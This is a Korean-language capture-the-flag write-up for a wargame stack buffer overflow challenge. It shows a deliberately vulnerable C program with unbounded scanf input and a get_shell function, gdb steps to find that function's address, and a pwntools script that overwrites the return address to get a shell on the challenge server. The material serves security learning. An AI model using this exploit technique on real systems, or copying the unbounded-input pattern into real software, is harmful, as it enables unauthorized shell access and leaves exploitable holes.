# 문제 파일
```
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

  1) 문제 파악
     - main함수를 보면 0x28크기의 버퍼가 있다. %s는 문자열 길이를 제한해서 받지 않기 때문에 버퍼 오버플로우가 발생할 수 있다.
     - 40바이트 이상의 데이터를 넣어서 main함수의 반환 주소를 셸을 실행하는 코드가 있는 get_shell함수로 변경해야 한다.
    
  2) 컴파일 하기
     - 우선 이 코드를 컴파일해서 get_shell()함수 저장된 메모리 주소를 알아야 한다.

  3) gdb로 get_shell가 저장된 메모리 주소를 파악하기
     - $ gdb ./rao    // 가상 환경에서 rao파일을 로드한다.
     - $ p &get_shell  // get_shell의 시작 주소를 확인한다. 또는  $ info address get_shell 명령어를 사용해도 좋다.
     -  ~~0x4011dd  라는 주소가 나왔다.~~

     - 주소가 잘못되었다. 내가 직접 컴파일한 바이너리가 서버에 있는 바이너리와 동일하다는 보장이 없다. **즉, 컴파일 환경과 실행 환경에 따라 함수의 주소가 달라질 수 있다**. 문제에서 바이너리도 함께 주는 데 이 파일을 사용해야 한다...

     - gdb를 활용해 주어진 바이너리를 디버깅한다. p get_shell 로 심볼 테이블 조회를 한 결과 0x4006aa라는 주소를 알아냈다.
       
    
  5) 익스플로잇 하기
     - 페이로드 파일을 만들자.
       ```
       from pwn import *
        
        # 외부 서버 정보
        host = "host3.dreamhack.games"  # 예: "host3.dreamhack.games"
        port = 11480  # 해당 서버의 포트 번호
        
        # 페이로드 생성
        payload = b"A" * 0x30  # 버퍼 크기
        payload += b"B" * 0x8  # rbp 덮기
        payload += p64(0x4006aa)  # get_shell 함수 주소
        
        # 서버와 연결
        p = remote(host, port)
        
        # 페이로드 전송
        p.sendline(payload)
        
        # 상호작용 모드 (쉘 확인)
        p.interactive()
       ```
